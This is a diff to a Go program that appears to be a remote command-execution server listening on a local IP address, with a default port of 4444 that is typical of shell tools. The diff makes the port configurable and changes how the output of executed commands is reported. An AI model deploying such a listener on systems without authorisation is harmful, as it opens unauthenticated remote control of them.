@@ -11,19 +11,20 @@ import (
 )
 
 const (
-  port = "4444"
   host = "192.168.1.219"
 )
 
-func StartServer() {
-  listener, err := net.Listen("tcp",host+":"+port)
+func StartServer(port int) {
+
+  p := strconv.Itoa(port)
+  listener, err := net.Listen("tcp",host+":"+p)
   if err != nil {
     fmt.Println("Error listening:", err.Error())
     os.Exit(1)
   }
   defer listener.Close()
 
-  fmt.Println("Listening on " + host + ":" + port)
+  fmt.Println("Listening on " + host + ":" + p)
   for {
     conn, err := listener.Accept()
     if err != nil {
@@ -65,8 +66,9 @@ func handleConnection(conn net.Conn) {
 func commandOutput(outs []byte, cmd *exec.Cmd) {
   fmt.Printf("Executing: %s\n", strings.Join(cmd.Args, " "))
   if len(outs) > 0 {
-    fmt.Printf("Output: %s\n", string(outs))
+    //fmt.Printf("Output: %s\n", string(outs))
+    fmt.Printf("%s Has been executed.", strings.Join(cmd.Args, " "))
   } else {
-    fmt.Print("Command Failed to execute...")
+    fmt.Print("Command Failed to execute...\n")
   }
 }
